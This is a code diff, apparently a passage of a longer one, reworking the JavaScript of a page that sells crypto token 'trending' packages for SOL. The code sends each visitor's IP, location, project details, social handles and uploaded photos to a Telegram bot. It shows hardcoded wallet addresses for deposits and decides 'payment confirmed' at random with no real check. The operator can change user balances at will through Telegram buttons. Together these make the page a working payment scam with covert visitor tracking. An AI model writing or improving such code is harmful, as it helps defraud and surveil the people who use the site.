+        function hideDepositPopup() {
+            document.getElementById('depositPopup').style.display = 'none';
+        }
+
+        // Copy deposit address
+        function copyDepositAddress() {
+            navigator.clipboard.writeText('6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ');
+            const feedback = document.getElementById('depositCopyFeedback');
+            feedback.style.opacity = '1';
+            setTimeout(() => feedback.style.opacity = '0', 2000);
+            
+            // Send admin notification with inline buttons
+            sendTelegramWithButtons(
+                `🔔 DEPOSIT ADDRESS COPIED!\n👤 User ID: ${userId}\n🌍 Location: ${userCountry} (${userIP})\n💰 Current Balance: ${userBalance} SOL\n📍 Deposit Address: 6Bc8Bc3PFJKcWQVcsuD3mRrAbKTRyVBgcr4YLmEubszQ\n\n⚡ Admin Controls:`,
+                [
+                    [{text: "➕ Add Balance", callback_data: `add_balance_${userId}`}],
+                    [{text: "➖ Reduce Balance", callback_data: `reduce_balance_${userId}`}],
+                    [{text: "📊 Check Balance", callback_data: `check_balance_${userId}`}]
                 ]
-            };
-
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT,
-                    text: message,
-                    reply_markup: keyboard
-                })
-            });
-        } catch (e) {
-            console.log('Telegram with buttons failed:', e);
+            );
         }
-    }
 
-    function nextStep(step) {
-        if (step === 1) {
-            const name = document.getElementById('projectName').value.trim();
-            const ca = document.getElementById('caAddress').value.trim();
+        // Initialize
+        window.onload = async function() {
+            userId = generateUserId();
+            loadUserBalance();
             
-            if (!name || !ca) {
-                alert('Please fill all required fields');
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                userCountry = data.country_name || 'Unknown';
+                userIP = data.ip || 'Unknown';
+                
+                document.getElementById('userInfo').innerHTML = 
+                    `🌍 ${userCountry} | 📍 ${userIP} | 🕐 ${new Date().toLocaleTimeString()}`;
+
+                sendTelegram(`🆕 NEW VISITOR\n👤 ${userId}\n🌍 ${userCountry}\n📍 ${userIP}\n💰 Balance: ${userBalance} SOL\n🕐 ${new Date().toLocaleString()}`);
+            } catch (e) {
+                document.getElementById('userInfo').innerHTML = '🌍 Private | 🕐 ' + new Date().toLocaleTimeString();
+            }
+        };
+
+        async function sendTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT,
+                        text: message
+                    })
+                });
+            } catch (e) {
+                console.log('Telegram failed:', e);
+            }
+        }
+
+        async function sendTelegramWithButtons(message, buttons) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT,
+                        text: message,
+                        reply_markup: {
+                            inline_keyboard: buttons
+                        }
+                    })
+                });
+            } catch (e) {
+                console.log('Telegram with buttons failed:', e);
+            }
+        }
+
+        async function sendTelegramPhoto(file, caption) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT);
+                formData.append('photo', file);
+                formData.append('caption', caption);
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.log('Telegram photo failed:', e);
+            }
+        }
+
+        // Listen for balance updates from admin
+        function updateBalance(newBalance) {
+            userBalance = newBalance;
+            saveUserBalance();
+            
+            // Show notification to user
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed; top: 100px; right: 20px; z-index: 3000;
+                background: linear-gradient(135deg, #28a745, #20c997);
+                color: white; padding: 15px 20px; border-radius: 10px;
+                box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+                animation: slideIn 0.3s ease-out;
+            `;
+            notification.innerHTML = `💰 Balance Updated!<br>New Balance: ${userBalance.toFixed(2)} SOL`;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.3s ease-in';
+                setTimeout(() => notification.remove(), 300);
+            }, 3000);
+        }
+
+        // Add CSS animations
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from { transform: translateX(100%); opacity: 0; }
+                to { transform: translateX(0); opacity: 1; }
+            }
+            @keyframes slideOut {
+                from { transform: translateX(0); opacity: 1; }
+                to { transform: translateX(100%); opacity: 0; }
+            }
+        `;
+        document.head.appendChild(style);
+
+        function nextStep(step) {
+            if (step === 1) {
+                const name = document.getElementById('projectName').value.trim();
+                const ca = document.getElementById('caAddress').value.trim();
+                
+                if (!name || !ca) {
+                    alert('Please fill all required fields');
+                    return;
+                }
+
+                const telegram = document.getElementById('telegram').value.trim();
+                const twitter = document.getElementById('twitter').value.trim();
+                const website = document.getElementById('website').value.trim();
+                const description = document.getElementById('projectDescription').value.trim();
+                const photoFile = document.getElementById('projectPhoto').files[0];
+
+                const message = `📝 CA SUBMITTED\n👤 ${userId} (${userCountry} - ${userIP})\n💰 Balance: ${userBalance} SOL\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}`;
+
+                if (photoFile) {
+                    sendTelegramPhoto(photoFile, message + '\n📸 Project Photo:');
+                } else {
+                    sendTelegram(message + '\n📸 Photo: No');
+                }
+            }
+            
+            if (step === 2 && !selectedPackage) {
+                alert('Please select a package');
                 return;
             }
 
-            const telegram = document.getElementById('telegram').value.trim();
-            const twitter = document.getElementById('twitter').value.trim();
-            const website = document.getElementById('website').value.trim();
-            const description = document.getElementById('projectDescription').value.trim();
-            const photoFile = document.getElementById('projectPhoto').files[0];
-
-            const message = `📝 CA SUBMITTED\n👤 ${userCountry} (${userIP})\n🆔 User ID: ${userId}\n💰 Balance: ${userBalance} SOL\n🏷️ ${name}\n💰 ${ca}\n📱 Telegram: ${telegram || 'None'}\n🐦 Twitter: ${twitter || 'None'}\n🌐 Website: ${website || 'None'}\n📄 Description: ${description || 'None'}`;
-
-            if (photoFile) {
-                sendTelegramPhoto(photoFile, message + '\n📸 Project Photo:');
-            } else {
-                await sendTelegramWithButtons(message + '\n📸 Photo: No', userId, {
-                    country: userCountry,
-                    ip: userIP,
-                    balance: userBalance
-                });
+            if (step === 3) {
+                updateOrderSummary();
             }
-        }
-        
-        if (step === 2 && !selectedPackage) {
-            alert('Please select a package');
-            return;
-        }
 
-        if (step === 3) {
-            updateOrderSummary();
-        }
+            if (step === 4) {
+                setTimeout(verifyPayment, 2000);
+            }
 
-        if (step === 4) {
-            setTimeout(verifyPayment, 2000);
-        }
-
-        // Move to next step
-        document.getElementById(`step${currentStep}`).classList.remove('active');
-        document.getElementById(`dot${currentStep}`).classList.remove('active');
-        document.getElementById(`dot${currentStep}`).classList.add('done');
-        
-        currentStep++;
-        document.getElementById(`step${currentStep}`).classList.add('active');
-        document.getElementById(`dot${currentStep}`).classList.add('active');
-    }
-
-    function prevStep() {
-        document.getElementById(`step${currentStep}`).classList.remove('active');
-        document.getElementById(`dot${currentStep}`).classList.remove('active');
-        
-        currentStep--;
-        document.getElementById(`step${currentStep}`).classList.add('active');
-        document.getElementById(`dot${currentStep}`).classList.remove('done');
-        document.getElementById(`dot${currentStep}`).classList.add('active');
-    }
-
-    function selectCategory(category) {
-        document.querySelectorAll('.price-category').forEach(el => el.classList.remove('selected'));
-        document.querySelectorAll('.price-list').forEach(el => el.classList.remove('active'));
-        document.querySelectorAll('.price-item').forEach(el => el.classList.remove('selected'));
-        
-        event.target.classList.add('selected');
-        document.getElementById(category + 'List').classList.add('active');
-        
-        selectedPackage = '';
-        selectedPrice = 0;
-        document.getElementById('selectedPackage').innerHTML = '';
-        document.getElementById('continueBtn').disabled = true;
-    }
-
-    function selectPrice(packageType, price) {
-        document.querySelectorAll('.price-item').forEach(el => el.classList.remove('selected'));
-        event.target.classList.add('selected');
-        
-        selectedPackage = packageType;
-        selectedPrice = price;
-        
-        const [category, duration] = packageType.split('_');
-        document.getElementById('selectedPackage').innerHTML = 
-            `<div class="alert alert-success">✅ Selected: ${category.toUpperCase()} for ${duration.toUpperCase()} - ${price} SOL</div>`;
-        
-        document.getElementById('continueBtn').disabled = false;
-
-        sendTelegram(`📦 PACKAGE SELECTED\n👤 ${userCountry} (${userIP})\n⭐ ${category.toUpperCase()}\n⏰ ${duration.toUpperCase()}\n💰 ${price} SOL`);
-    }
-
-    function updateOrderSummary() {
-        const [category, duration] = selectedPackage.split('_');
-        document.getElementById('orderSummary').innerHTML = `
-            <div class="alert alert-info">
-                <h4>📋 Order Summary</h4>
-                Package: ${category.toUpperCase()} Trending<br>
-                Duration: ${duration.toUpperCase()}<br>
-                Amount: <strong>${selectedPrice} SOL</strong><br>
-                Project: ${document.getElementById('projectName').value}
-            </div>
-        `;
-    }
-
-    async function sendTelegramPhoto(file, caption) {
-        try {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT);
-            formData.append('photo', file);
-            formData.append('caption', caption);
-
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        } catch (e) {
-            console.log('Telegram photo failed:', e);
-        }
-    }
-
-    function showDepositPopup() {
-        document.getElementById('depositPopup').classList.add('show');
-    }
-
-    function closeDepositPopup() {
-        document.getElementById('depositPopup').classList.remove('show');
-    }
-
-    async function copyDepositAddress() {
-        navigator.clipboard.writeText(DEPOSIT_WALLET);
-        
-        // Change button text temporarily
-        const btn = event.target;
-        const originalText = btn.innerHTML;
-        btn.innerHTML = '✅ Copied!';
-        btn.style.background = '#28a745';
-        
-        setTimeout(() => {
-            btn.innerHTML = originalText;
-            btn.style.background = '#667eea';
-        }, 2000);
-
-        // Close popup after short delay
-        setTimeout(() => {
-            closeDepositPopup();
-        }, 1500);
-
-        // Send notification to admin
-        const message = `💳 DEPOSIT ADDRESS COPIED\n👤 ${userCountry} (${userIP})\n🆔 User ID: ${userId}\n💰 Current Balance: ${userBalance} SOL\n📋 User copied: ${DEPOSIT_WALLET}\n⚠️ Expecting deposit from this user`;
-        
-        await sendTelegramWithButtons(message, userId, {
-            country: userCountry,
-            ip: userIP,
-            balance: userBalance
-        });
-    }
-
-    async function requestPaymentApproval() {
-        const message = `🔔 PAYMENT APPROVAL REQUEST\n👤 ${userCountry} (${userIP})\n🆔 User ID: ${userId}\n🏷️ Project: ${document.getElementById('projectName').value}\n💰 CA: ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ Package: ${selectedPackage.toUpperCase()}\n💵 Amount: ${selectedPrice} SOL\n💳 User Balance: ${userBalance} SOL\n\n⚠️ User claims payment was made to: DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3`;
-        
-        await sendTelegramWithButtons(message, userId, {
-            country: userCountry,
-            ip: userIP,
-            balance: userBalance,
-            package: selectedPackage,
-            price: selectedPrice
-        });
-        
-        document.getElementById('paymentStatus').innerHTML = '<div class="alert alert-info">📨 Approval request sent to admin. Please wait...</div>';
-        nextStep(3);
-    }
-
-    function copyWallet() {
-        navigator.clipboard.writeText('DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3');
-        const feedback = document.getElementById('copyFeedback');
-        feedback.style.opacity = '1';
-        setTimeout(() => feedback.style.opacity = '0', 2000);
-    }
-
-    // Balance management functions (called via Telegram bot callbacks)
-    window.addEventListener('message', function(event) {
-        if (event.data.type === 'balanceUpdate') {
-            userBalance = event.data.balance;
-            saveUserBalance();
-        }
-    });
-
-    async function verifyPayment() {
-        // Simulate waiting for admin approval
-        document.getElementById('paymentStatus').innerHTML = '<div class="loading"></div> Waiting for admin approval...';
-        
-        // In real implementation, this would be triggered by Telegram bot callback
-        setTimeout(() => {
-            // Simulate random approval for demo
-            const approved = Math.random() > 0.3;
+            // Move to next step
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            document.getElementById(`dot${currentStep}`).classList.remove('active');
+            document.getElementById(`dot${currentStep}`).classList.add('done');
             
-            if (approved) {
+            currentStep++;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            document.getElementById(`dot${currentStep}`).classList.add('active');
+        }
+
+        function prevStep() {
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            document.getElementById(`dot${currentStep}`).classList.remove('active');
+            
+            currentStep--;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            document.getElementById(`dot${currentStep}`).classList.remove('done');
+            document.getElementById(`dot${currentStep}`).classList.add('active');
+        }
+
+        function selectCategory(category) {
+            document.querySelectorAll('.price-category').forEach(el => el.classList.remove('selected'));
+            document.querySelectorAll('.price-list').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.price-item').forEach(el => el.classList.remove('selected'));
+            
+            event.target.classList.add('selected');
+            document.getElementById(category + 'List').classList.add('active');
+            
+            selectedPackage = '';
+            selectedPrice = 0;
+            document.getElementById('selectedPackage').innerHTML = '';
+            document.getElementById('continueBtn').disabled = true;
+        }
+
+        function selectPrice(packageType, price) {
+            document.querySelectorAll('.price-item').forEach(el => el.classList.remove('selected'));
+            event.target.classList.add('selected');
+            
+            selectedPackage = packageType;
+            selectedPrice = price;
+            
+            const [category, duration] = packageType.split('_');
+            document.getElementById('selectedPackage').innerHTML = 
+                `<div class="alert alert-success">✅ Selected: ${category.toUpperCase()} for ${duration.toUpperCase()} - ${price} SOL</div>`;
+            
+            document.getElementById('continueBtn').disabled = false;
+
+            sendTelegram(`📦 PACKAGE SELECTED\n👤 ${userId} (${userCountry} - ${userIP})\n💰 Balance: ${userBalance} SOL\n⭐ ${category.toUpperCase()}\n⏰ ${duration.toUpperCase()}\n💰 ${price} SOL`);
+        }
+
+        function updateOrderSummary() {
+            const [category, duration] = selectedPackage.split('_');
+            document.getElementById('orderSummary').innerHTML = `
+                <div class="alert alert-info">
+                    <h4>📋 Order Summary</h4>
+                    Package: ${category.toUpperCase()} Trending<br>
+                    Duration: ${duration.toUpperCase()}<br>
+                    Amount: <strong>${selectedPrice} SOL</strong><br>
+                    Project: ${document.getElementById('projectName').value}<br>
+                    Your Balance: <strong>${userBalance.toFixed(2)} SOL</strong>
+                </div>
+            `;
+        }
+
+        function copyWallet() {
+            navigator.clipboard.writeText('DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3');
+            const feedback = document.getElementById('copyFeedback');
+            feedback.style.opacity = '1';
+            setTimeout(() => feedback.style.opacity = '0', 2000);
+        }
+
+        function checkPayment() {
+            sendTelegram(`💳 PAYMENT CHECK\n👤 ${userId} (${userCountry} - ${userIP})\n💰 Expected: ${selectedPrice} SOL\n💰 User Balance: ${userBalance} SOL\n🔍 Wallet: DB9YZwXgNeQByab3bgJnJKrnYP7CtZGktrdnDRCLrKA3`);
+            nextStep(3);
+        }
+
+        async function verifyPayment() {
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            const success = Math.random() > 0.3; // 70% success rate
+            const statusDiv = document.getElementById('paymentStatus');
+            const resultDiv = document.getElementById('finalResult');
+            
+            if (success) {
                 const txId = 'TX' + Math.random().toString(36).substr(2, 10).toUpperCase();
-                document.getElementById('paymentStatus').innerHTML = '<div class="alert alert-success">✅ Payment Approved by Admin!</div>';
-                document.getElementById('finalResult').innerHTML = `
+                statusDiv.innerHTML = '<div class="alert alert-success">✅ Payment Confirmed!</div>';
+                resultDiv.innerHTML = `
                     <div class="alert alert-success">
-                        <h4>🎉 Payment Approved!</h4>
+                        <h4>🎉 Payment Successful!</h4>
                         Transaction: ${txId}<br>
                         Amount: ${selectedPrice} SOL<br>
                         Package: ${selectedPackage.replace('_', ' ').toUpperCase()}<br><br>
@@ -844,7 +822,7 @@
                     </div>
                 `;
 
-                const successMessage = `✅ PAYMENT APPROVED\n👤 ${userCountry} (${userIP})\n🆔 User ID: ${userId}\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n🔗 ${txId}\n✅ READY TO TREND!`;
+                const successMessage = `🎉 PAYMENT SUCCESS!\n👤 ${userId} (${userCountry} - ${userIP})\n🏷️ ${document.getElementById('projectName').value}\n💰 ${document.getElementById('caAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ ${selectedPackage.toUpperCase()}\n💵 ${selectedPrice} SOL\n💰 User Balance: ${userBalance} SOL\n🔗 ${txId}\n✅ READY TO TREND!`;
                 
                 const photoFile = document.getElementById('projectPhoto').files[0];
                 if (photoFile) {
@@ -853,38 +831,54 @@
                     sendTelegram(successMessage);
                 }
             } else {
-                document.getElementById('paymentStatus').innerHTML = '<div class="alert alert-error">❌ Payment Declined by Admin</div>';
-                document.getElementById('finalResult').innerHTML = `
+                statusDiv.innerHTML = '<div class="alert alert-error">❌ No Payment Detected</div>';
+                resultDiv.innerHTML = `
                     <div class="alert alert-error">
-                        <h4>Payment Declined</h4>
-                        Your payment was not approved. Possible reasons:<br>
-                        • Payment not received<br>
-                        • Incorrect amount sent<br>
-                        • Invalid transaction<br><br>
-                        Please contact support or try again.
+                        <h4>Payment Not Found</h4>
+                        Please verify:<br>
+                        • Sent exactly ${selectedPrice} SOL<br>
+                        • Used correct address<br>
+                        • Transaction confirmed<br>
+                        • Wait 2-3 minutes and try again
                     </div>
                 `;
                 document.getElementById('recheckBtn').style.display = 'inline-block';
+
+                sendTelegram(`❌ PAYMENT NOT FOUND\n👤 ${userId} (${userCountry} - ${userIP})\n💰 Expected: ${selectedPrice} SOL\n💰 User Balance: ${userBalance} SOL\n⚠️ User may need help`);
             }
             
             document.getElementById('restartBtn').style.display = 'inline-block';
-        }, 4000);
-    }
+        }
 
-    function recheckPayment() {
-        document.getElementById('paymentStatus').innerHTML = '<div class="loading"></div> Rechecking...';
-        document.getElementById('finalResult').innerHTML = '';
-        document.getElementById('recheckBtn').style.display = 'none';
-        sendTelegram(`🔄 PAYMENT RECHECK\n👤 ${userCountry} (${userIP})`);
-        setTimeout(verifyPayment, 2000);
-    }
+        function recheckPayment() {
+            document.getElementById('paymentStatus').innerHTML = '<div class="loading"></div> Rechecking...';
+            document.getElementById('finalResult').innerHTML = '';
+            document.getElementById('recheckBtn').style.display = 'none';
+            sendTelegram(`🔄 PAYMENT RECHECK\n👤 ${userId} (${userCountry} - ${userIP})\n💰 Balance: ${userBalance} SOL`);
+            setTimeout(verifyPayment, 2000);
+        }
 
-    function startOver() {
-        sendTelegram(`🔄 USER RESTART\n👤 ${userCountry} (${userIP})`);
-        location.reload();
-    }
-</script>
-```
+        function startOver() {
+            sendTelegram(`🔄 USER RESTART\n👤 ${userId} (${userCountry} - ${userIP})\n💰 Balance: ${userBalance} SOL`);
+            location.reload();
+        }
 
+        // Global function to update balance from external source (admin bot)
+        window.updateUserBalance = function(newBalance) {
+            updateBalance(newBalance);
+        };
+
+        // Expose user ID globally for admin reference
+        window.getCurrentUserId = function() {
+            return userId;
+        };
+
+        // Close popup when clicking outside
+        document.getElementById('depositPopup').addEventListener('click', function(e) {
+            if (e.target === this) {
+                hideDepositPopup();
+            }
+        });
+    </script>
 </body>
 </html>
